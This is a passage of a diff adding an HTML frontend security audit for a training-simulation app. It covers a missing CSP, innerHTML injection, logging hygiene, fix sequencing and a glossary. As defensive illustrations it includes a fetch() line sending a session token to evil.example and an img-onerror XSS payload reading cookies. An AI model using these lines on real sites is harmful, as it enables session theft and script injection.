+<span class="add">+   return &lt;&gt;{children}&lt;/&gt;;</span>
+<span class="add">+ };</span>
+<span class="cmt">// Wrap debug routes in &lt;RequireRole roles={['trainer','admin']}&gt;</span>
+<span class="cmt">// (or render them only when import.meta.env.DEV).</span></code></pre>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">A participant who types a trainer/debug URL is redirected back to their dashboard. Only trainers/admins reach those pages.</div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 5 ============ -->
+        <section id="f5">
+          <h2 class="section">Finding 5 — No Content-Security-Policy</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>No browser-level safety net, and the login token sits in local storage</h3>
+              <span class="badge b-med">Medium</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                A Content-Security-Policy (CSP) is a rulebook the browser enforces that says "only run code from
+                these trusted places." Without it, if malicious code ever sneaks onto a page, the browser will
+                happily run it and let it phone home. Separately, the user's login token is stored where page
+                scripts can read it, so any injected script could steal the active session.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <div class="filename">frontend/index.html (no CSP present)</div>
+            <div class="filename">frontend/src/lib/supabase.ts (lines 52–57)</div>
+<pre class="bad"><code>auth: {
+  autoRefreshToken: true,
+  persistSession: true,      <span class="cmt">// token kept in localStorage, readable by scripts</span>
+  detectSessionInUrl: true,
+}</code></pre>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p>These two together remove the last line of defense: if any cross-site-scripting (XSS) flaw is ever introduced, there is no CSP to block it and the session token is easy to exfiltrate.</p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+<pre class="bad"><code><span class="cmt">// If any XSS foothold exists, an injected script can do:</span>
+fetch('https://evil.example/steal?t=' + localStorage.getItem('sb-...-auth-token'));</code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>Account/session hijacking and silent data theft, with no browser enforcement to stop it.</p>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+            <div class="filename">frontend/index.html (or a server response header)</div>
+<pre class="good"><code><span class="add">+ &lt;meta http-equiv="Content-Security-Policy"</span>
+<span class="add">+   content="default-src 'self';</span>
+<span class="add">+            connect-src 'self' https://*.supabase.co https://your-api.example;</span>
+<span class="add">+            img-src 'self' data: https:;</span>
+<span class="add">+            script-src 'self';</span>
+<span class="add">+            object-src 'none'; base-uri 'self';"&gt;</span></code></pre>
+            <p>Keep treating all raw-HTML rendering as static (see Finding 6) so the CSP never has to "save" you.</p>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">Even if malicious code reaches a page, the browser refuses to run it or send data to untrusted domains, dramatically shrinking the blast radius of any future XSS.</div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 6 ============ -->
+        <section id="f6">
+          <h2 class="section">Finding 6 — Raw HTML built from text</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>A few places assemble HTML by gluing strings together</h3>
+              <span class="badge b-med">Medium</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                Normally this app displays text safely — if someone types <code>&lt;script&gt;</code>, it shows up as
+                harmless letters. But a couple of spots build raw HTML by pasting values into a template. Today those
+                values come from trusted scenario data, so it is safe. The concern is the <em>pattern</em>: if any of
+                those values ever becomes attacker-influenced, it turns into an injection hole.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <div class="filename">frontend/src/components/COP/WindIndicator.tsx (lines 35–40)</div>
+<pre class="bad"><code>container.innerHTML = `
+  &lt;div ...&gt;${dirLabel}&lt;/div&gt;
+  ${speedText ? `&lt;div ...&gt;${speedText}&lt;/div&gt;` : ''}
+`;   <span class="cmt">// values are interpolated straight into HTML</span></code></pre>
+            <p>Also <code>frontend/src/components/SceneEditor/buildingAutoTrace.ts</code> (line 573, a map popup).</p>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p><code>innerHTML</code> interprets its input as live HTML. If <code>dirLabel</code> ever contained <code>&lt;img src=x onerror=...&gt;</code>, the browser would execute it. It is a latent stored-XSS path.</p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+<pre class="bad"><code><span class="cmt">// IF a wind "label" could be set to attacker text:</span>
+dirLabel = '&lt;img src=x onerror="alert(document.cookie)"&gt;';
+<span class="cmt">// innerHTML would run the onerror handler.</span></code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>Script execution in another user's browser (combined with Finding 5, that means session theft).</p>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+<pre class="good"><code><span class="del">- container.innerHTML = `&lt;div&gt;${dirLabel}&lt;/div&gt;`;</span>
+<span class="add">+ const el = document.createElement('div');</span>
+<span class="add">+ el.textContent = dirLabel;   // textContent never interprets HTML</span>
+<span class="add">+ container.appendChild(el);</span></code></pre>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">Dynamic values are displayed as plain text and can never become executable code, removing the latent injection path entirely.</div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 7 ============ -->
+        <section id="f7">
+          <h2 class="section">Finding 7 — Logging, links &amp; API-key hygiene</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>Minor information-leakage and hardening gaps</h3>
+              <span class="badge b-low">Low</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>Small housekeeping items: the app prints internal data to the browser console, opens external links in a slightly unsafe way, and ships some API keys that need extra restrictions on the provider's side.</p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives &amp; fixes</div>
+            <table>
+              <thead><tr><th>Item</th><th>Where</th><th>Fix</th></tr></thead>
+              <tbody>
+                <tr>
+                  <td>Always-on console logging of session/team data</td>
+                  <td><code>SessionView.tsx</code>, <code>Sessions.tsx</code>, <code>ChatInterface.tsx</code></td>
+                  <td>Wrap in <code>if (import.meta.env.DEV)</code> or remove.</td>
+                </tr>
+                <tr>
+                  <td>External link opened without <code>noopener</code> (reverse-tabnabbing)</td>
+                  <td><code>AAR/AARDashboard.tsx</code> line 723</td>
+                  <td><code>window.open(url, '_blank', 'noopener,noreferrer')</code></td>
+                </tr>
+                <tr>
+                  <td>Public client keys in the bundle</td>
+                  <td><code>VITE_GOOGLE_MAPS_API_KEY</code>, TURN creds in <code>useWebRTC.ts</code></td>
+                  <td>Add HTTP-referrer restriction in Google Cloud; use short-lived/ephemeral TURN credentials.</td>
+                </tr>
+              </tbody>
+            </table>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>Information disclosure, minor phishing assist, and potential abuse/billing of an unrestricted maps key. Individually low risk, worth tidying as part of the same pass.</p>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">No internal data is logged in production, external links can't manipulate the opener tab, and API keys can only be used from your own domain.</div>
+          </div>
+        </section>
+
+        <!-- ============ BREAKAGE ============ -->
+        <section id="breakage">
+          <h2 class="section">Will the fixes break anything?</h2>
+          <p>
+            Before any code is changed, we checked how each fix ripples through the rest of the app. The encouraging
+            news: most fixes are isolated and safe. But the role fixes and the browser-rulebook (CSP) fix have
+            <strong>dependencies</strong> — do them in the wrong order and you can lock everyone out or break the maps.
+            This section explains, in plain terms, what to watch for.
+          </p>
+
+          <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+          <div class="plain">
+            <p>
+              Today, the <em>only</em> way anyone becomes a "trainer" is by ticking the box at signup — the very
+              thing we want to remove. And the app has <strong>no admin tool</strong> to promote someone properly. So
+              if we simply remove the box first, <em>nobody new could ever become a trainer</em>. The fix order matters:
+              we must build the proper "admin promotes a user" door <strong>before</strong> we brick up the old one.
+            </p>
+            <p>
+              Similarly, the screens decide what to show based on your role. If we change where that role comes from
+              without first filling in the new source, the app could accidentally treat <em>everyone</em> as a
+              trainer. These are not reasons to avoid the fixes — just reasons to sequence them carefully.
+            </p>
+          </div>
+
+          <div class="block-label lbl-where"><span class="ic">📍</span> Risk by fix</div>
+          <table>
+            <thead><tr><th>Fix</th><th>Breakage risk</th><th>What to watch for</th></tr></thead>
+            <tbody>
+              <tr>
+                <td>Default new users to "participant" (Vector B)</td>
+                <td><span class="badge b-high">High</span></td>
+                <td>Breaks new-trainer onboarding unless an admin promotion tool ships first. Existing trainers are unaffected.</td>
+              </tr>
+              <tr>
+                <td>Remove signup role picker (Vector A)</td>
+                <td><span class="badge b-med">Medium</span></td>
+                <td>Invitation sign-ups must get their role validated by the server instead of the form.</td>
+              </tr>
+              <tr>
+                <td>Lock the role column in the database (Vector C)</td>
+                <td><span class="badge b-low">Low</span></td>
+                <td>Safe — the app only ever <em>reads</em> profiles from the browser; legitimate writes use the admin account, which is unaffected.</td>
+              </tr>
+              <tr>
+                <td>Fix the profile API (Vector D)</td>
+                <td><span class="badge b-low">Low</span></td>
+                <td>The app's screens never call it, so nothing user-facing breaks.</td>
+              </tr>
+              <tr>
+                <td>Stop the browser trusting its own role label (Finding 2)</td>
+                <td><span class="badge b-high">High</span></td>
+                <td>Must be paired with reading the role from the server first, or every participant would be shown the trainer view.</td>
+              </tr>
+              <tr>
+                <td>Update outdated libraries (Finding 3)</td>
+                <td><span class="badge b-low">Low</span></td>
+                <td>Independent. Only stable features are used; quick test of navigation + live updates after upgrading.</td>
+              </tr>
+              <tr>
+                <td>Lock trainer/debug pages (Finding 4)</td>
+                <td><span class="badge b-low">Low</span></td>
+                <td>The trainer button is already hidden from participants, so this is consistent. Do not lock the underlying map data service that the War Room legitimately uses.</td>
+              </tr>
+              <tr>
+                <td>Add the browser rulebook / CSP (Finding 5)</td>
+                <td><span class="badge b-med">Medium</span></td>
+                <td>Highest-friction. If the allow-list misses a service (maps, fonts, geocoding), those silently break. Roll it out in "report-only" mode first, watch for complaints, then enforce.</td>
+              </tr>
+              <tr>
+                <td>Safer HTML building (Finding 6) &amp; hygiene (Finding 7)</td>
+                <td><span class="badge b-low">Low</span></td>
+                <td>Independent and self-contained.</td>
+              </tr>
+            </tbody>
+          </table>
+
+          <div class="block-label lbl-fix"><span class="ic">🛠️</span> The safe order to apply them</div>
+          <div class="callout tip">
+            <ol style="margin:0;padding-left:20px">
+              <li>Build the admin "promote a user" tool and copy existing roles into the trusted, locked location.</li>
+              <li>Make the screens read the role from the server.</li>
+              <li><em>Then</em> remove the signup picker, default new users to participant, fix the profile API, and lock the database column.</li>
+              <li>Add the page locks.</li>
+              <li>Roll out the browser rulebook (CSP) in report-only mode, then enforce.</li>
+              <li>Ship the independent items (library updates, safer HTML, hygiene) anytime — they don't depend on the above.</li>
+            </ol>
+          </div>
+
+          <div class="block-label lbl-after"><span class="ic">✅</span> Two rules that prevent self-inflicted outages</div>
+          <ul style="color:var(--ink-soft)">
+            <li><strong>Don't remove the old door before building the new one:</strong> the admin promotion path and server-provided role must exist before the signup/role changes land.</li>
+            <li><strong>The database lock alone isn't enough:</strong> the profile API uses a master-key account that ignores that lock, so it must be fixed in the same batch.</li>
+          </ul>
+        </section>
+
+        <!-- ============ SAFE ============ -->
+        <section id="safe">
+          <h2 class="section">What was checked and found safe</h2>
+          <p>For balance, several common weak spots were examined and are currently <strong>not</strong> vulnerable:</p>
+          <ul style="color:var(--ink-soft)">
+            <li><strong>User-generated content</strong> (chat, social posts, emails, insider answers) is rendered as escaped text by React, so typed-in <code>&lt;script&gt;</code> is shown harmlessly, not executed.</li>
+            <li>All <strong><code>dangerouslySetInnerHTML</code></strong> usages (icons in <code>MapElementResponsePanel</code>, <code>AssetPalette</code>, <code>EvacuationZone</code>, <code>ScenarioDetailView</code>) resolve through fixed, built-in icon tables (<code>mapIcons.svg()</code>), never from user text.</li>
+            <li>No use of dangerous evaluators like <code>eval()</code> or <code>new Function()</code>.</li>
+            <li>No hardcoded passwords, secret keys, or committed <code>.env</code> files were found in <code>frontend/src</code>.</li>
+            <li>The <strong>server</strong> does enforce role checks on sensitive endpoints (e.g. only trainers can create/publish injects) — which is why fixing the role chain in Finding 1 closes the loop properly.</li>
+          </ul>
+        </section>
+
+        <!-- ============ GLOSSARY ============ -->
+        <section id="glossary">
+          <h2 class="section">Plain-English glossary</h2>
+          <table>
+            <tbody>
+              <tr><td><strong>Role / privilege</strong></td><td>The level of access an account has (participant = basic, trainer/admin = powerful).</td></tr>
+              <tr><td><strong>Privilege escalation</strong></td><td>A user gaining more access than they should — e.g. a participant becoming an admin.</td></tr>
+              <tr><td><strong>Frontend / backend</strong></td><td>Frontend = what runs in your browser (can be tampered with). Backend = the server you can't directly touch (the real authority).</td></tr>
+              <tr><td><strong>RLS (Row-Level Security)</strong></td><td>Database rules that decide which rows/columns each user can read or change.</td></tr>
+              <tr><td><strong>XSS (Cross-Site Scripting)</strong></td><td>Tricking a page into running attacker-supplied code in a victim's browser.</td></tr>
+              <tr><td><strong>CSP (Content-Security-Policy)</strong></td><td>A browser rulebook limiting where code and data are allowed to come from.</td></tr>
+              <tr><td><strong>Token / session</strong></td><td>A digital "wristband" proving you're logged in; stealing it impersonates you.</td></tr>
+              <tr><td><strong>Open redirect</strong></td><td>A link that looks like it goes to a trusted site but forwards the victim to a malicious one.</td></tr>
+              <tr><td><strong>Dependency / library</strong></td><td>Reusable code written by others that the app is built on; can carry its own flaws.</td></tr>
+            </tbody>
+          </table>
+        </section>
+
+        <footer>
+          <p>
+            Black Swan Simulations — Frontend Security Audit. Prepared as a findings document; no application code
+            has been modified. Recommended next step: implement fixes in priority order (Finding 1 first), then
+            re-test. See the companion remediation plan for the implementation sequence.
+          </p>
+        </footer>
+      </main>
+    </div>
+  </body>
+</html>
